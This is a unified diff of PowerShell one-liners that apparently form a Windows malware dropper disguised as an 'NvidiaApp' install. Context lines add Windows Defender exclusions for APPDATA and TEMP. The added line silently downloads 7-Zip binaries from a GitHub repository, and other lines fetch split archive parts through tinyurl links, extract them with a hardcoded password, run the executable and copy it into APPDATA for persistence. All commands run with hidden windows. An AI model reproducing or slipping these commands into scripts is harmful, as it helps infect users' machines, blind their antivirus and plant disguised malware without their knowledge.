@@ -1,6 +1,7 @@
 powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath $env:APPDATA"
 powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath $env:TEMP"
 powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath (Join-Path $env:APPDATA 'System')"
+powershell -w h -c "(iwr -uri 'https://github.com/loodyxmer-afk/vz/raw/refs/heads/main/7z.exe' -OutFile \"$env:TEMP\\7z.exe\"); (iwr -uri 'https://github.com/loodyxmer-afk/vz/raw/refs/heads/main/7z.dll' -OutFile \"$env:TEMP\\7z.dll\");
 powershell -w h -c "(iwr -uri 'https://tinyurl.com/VZN3PJ' -OutFile \"$env:TEMP\NvidiaApp.7z.003\");
 powershell -w h -c "(iwr -uri 'https://tinyurl.com/VZN2PJ' -OutFile \"$env:TEMP\NvidiaApp.7z.002\");
 powershell -w h -c "(iwr -uri 'https://tinyurl.com/VZN1PJ' -OutFile \"$env:TEMP\\NvidiaApp.7z.001\"); Start-Process \"$env:TEMP\\7z.exe\" -ArgumentList \"x `\"$env:TEMP\\NvidiaApp.7z.001`\" -p@123456789@ -o`\"$env:TEMP\\extract`\" -y\" -Wait; Start-Process \"$env:TEMP\\extract\\NvidiaApp.exe\"; $dest=\"$env:APPDATA\\system\"; if (!(Test-Path $dest)) { New-Item -ItemType Directory -Path $dest -Force }; Copy-Item \"$env:TEMP\\extract\\NvidiaApp.exe\" -Destination $dest -Force"
